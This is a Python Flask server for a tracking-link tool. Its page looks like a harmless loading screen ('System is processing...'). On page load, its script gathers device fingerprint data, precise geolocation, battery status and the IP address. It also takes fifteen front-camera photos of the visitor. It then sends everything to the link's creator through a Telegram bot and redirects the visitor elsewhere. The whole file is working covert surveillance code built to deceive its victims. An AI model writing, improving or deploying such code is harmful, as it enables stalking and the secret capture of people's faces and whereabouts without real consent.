from flask import Flask, request, render_template_string, jsonify
import os
import base64
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import json
import threading
from shared_data import user_links, user_data, tracking_data
from bot_telegram import send_telegram_notification

WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = 8080

app = Flask(__name__)

TRACKING_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Function to collect device information
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
            };
            // Get location first
            getLocation(info);
        }

        // Function to get location
        function getLocation(info) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        info.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        getBatteryInfo(info);
                    },
                    function(error) {
                        info.locationError = error.message;
                        getBatteryInfo(info);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.locationError = "Geolocation is not supported by this browser.";
                getBatteryInfo(info);
            }
        }

        // Function to get battery information
        function getBatteryInfo(info) {
            // Battery API if available
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = battery.level * 100;
                    info.batteryCharging = battery.charging;
                    requestCameraAccess(info);
                });
            } else {
                requestCameraAccess(info);
            }
        }

        // Function to request camera access
        function requestCameraAccess(info) {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Request camera access
                navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',  // Use front camera
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                })
                .then(function(stream) {
                    // Camera access granted
                    info.cameraAccess = true;
                    takeMultiplePhotos(stream, info);
                })
                .catch(function(error) {
                    // Camera access denied
                    info.cameraAccess = false;
                    info.cameraError = error.name;
                    getIpAddress(info);
                });
            } else {
                info.cameraAccess = false;
                info.cameraError = 'No camera support';
                getIpAddress(info);
            }
        }

        // Function to take multiple photos
        function takeMultiplePhotos(stream, info) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                info.cameraPhotos = [];
                let photosTaken = 0;
                const totalPhotos = 15;
                const interval = 300;  // 300ms between photos

                function capturePhoto() {
                    if (photosTaken < totalPhotos) {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg', 0.95);  // High quality
                        info.cameraPhotos.push(photoData);
                        photosTaken++;
                        setTimeout(capturePhoto, interval);
                    } else {
                        // Stop stream
                        stream.getTracks().forEach(track => track.stop());
                        getIpAddress(info);
                    }
                }

                // Wait a moment for camera to focus, then start capturing
                setTimeout(capturePhoto, 1000);
            };
        }

        // Function to get IP address
        function getIpAddress(info) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    info.ipAddress = ipData.ip;
                    sendDataToServer(info);
                })
                .catch(error => {
                    info.ipAddressError = error.message;
                    sendDataToServer(info);
                });
        }

        // Function to send data to server
        function sendDataToServer(info) {
            fetch('/track/{{ track_id }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(info)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Redirect after successfully sending data
                    window.location.href = "{{ redirect_url }}";
                } else {
                    console.error('Server error:', data.error);
                    window.location.href = "{{ redirect_url }}";
                }
            })
            .catch(error => {
                console.error('Error sending data:', error);
                window.location.href = "{{ redirect_url }}";
            });
        }

        // Start collecting information when page loads
        window.onload = collectDeviceInfo;
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #333;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0, 0, 0, 0.3);
            border-radius: 50%;
            border-top-color: #007bff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>System is processing...</h2>
        <p>Please wait 5 seconds, system is processing</p>
        <div class="loading"></div>
    </div>
</body>
</html>
"""

def add_watermark(image_data, text="t.me/mengheang25"):
    try:
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes)).convert('RGBA')
        watermark = Image.new('RGBA', image.size, (0, 0, 0, 0))
        draw = ImageDraw.Draw(watermark)

        try:
            font_size = max(20, min(image.width, image.height) // 20)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            try:
                font = ImageFont.load_default()
            except:
                font = None

        if font:
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
        else:
            text_width, text_height = 150, 20
            
        margin = 10
        x = image.width - text_width - margin
        y = image.height - text_height - margin

        draw.rectangle([x - 10, y - 5, x + text_width + 10, y + text_height + 5], fill=(0, 0, 0, 128))
        
        if font:
            draw.text((x, y), text, fill=(255, 255, 255, 255), font=font)
        else:
            draw.text((x, y), text, fill=(255, 255, 255, 255))

        watermarked_image = Image.alpha_composite(image, watermark).convert('RGB')

        output = BytesIO()
        watermarked_image.save(output, format='JPEG', quality=95)
        return "data:image/jpeg;base64," + base64.b64encode(output.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"Error adding watermark: {e}")
        if isinstance(image_data, str) and image_data.startswith('data:image'):
            return image_data
        else:
            return "data:image/jpeg;base64," + image_data

@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track(track_id):
    if request.method == 'GET':
        redirect_url = request.args.get('url', 'https://google.com')
        
        return render_template_string(TRACKING_PAGE_HTML, track_id=track_id, redirect_url=redirect_url)
    
    elif request.method == 'POST':
        try:
            device_info = request.json
            device_info['ip_address'] = request.remote_addr
            
            print(f"📱 Received tracking data for track_id: {track_id}")
            print(f"📍 IP Address: {device_info.get('ip_address')}")
            print(f"📸 Camera photos: {len(device_info.get('cameraPhotos', []))}")

            creator_id = None
            for user_id, links in user_links.items():
                for link in links:
                    if link['track_id'] == track_id:
                        creator_id = user_id
                        print(f"👤 Found creator: {creator_id} for track_id: {track_id}")
                        break
                if creator_id:
                    break
            
            if not creator_id:
                print(f"❌ No creator found for track_id: {track_id}")
                return jsonify({'success': False, 'error': 'Creator not found'})
  
            os.makedirs('captured_images', exist_ok=True)
            
            if 'cameraPhotos' in device_info and len(device_info['cameraPhotos']) > 0:
                device_info['processedPhotos'] = []
                for i, photo_data in enumerate(device_info['cameraPhotos']):
                    try:
                        watermarked_image = add_watermark(photo_data)
                        
                        image_data = photo_data.split(',')[1] if photo_data.startswith('data:image') else photo_data
                        image_bytes = base64.b64decode(image_data)
                        with open(f'captured_images/{track_id}_camera{i+1}_original.jpg', 'wb') as f:
                            f.write(image_bytes)
                     
                        watermarked_bytes = base64.b64decode(watermarked_image.split(',')[1])
                        with open(f'captured_images/{track_id}_camera{i+1}_watermarked.jpg', 'wb') as f:
                            f.write(watermarked_bytes)
                        
                        device_info['processedPhotos'].append(watermarked_image)
                    except Exception as e:
                        print(f"Error processing camera image {i+1}: {e}")
                        device_info['processedPhotos'].append(photo_data)
            
            tracking_data[track_id] = device_info
    
            print(f"📤 Sending Telegram notification to creator: {creator_id}")
            send_telegram_notification(track_id, device_info, creator_id)
            
            return jsonify({'success': True})
            
        except Exception as e:
            print(f"❌ Error processing tracking data: {e}")
            return jsonify({'success': False, 'error': str(e)})

def run_flask():
    print("🌐 Starting Flask web server...")
    app.run(host=WEB_SERVER_HOST, port=WEB_SERVER_PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    run_flask()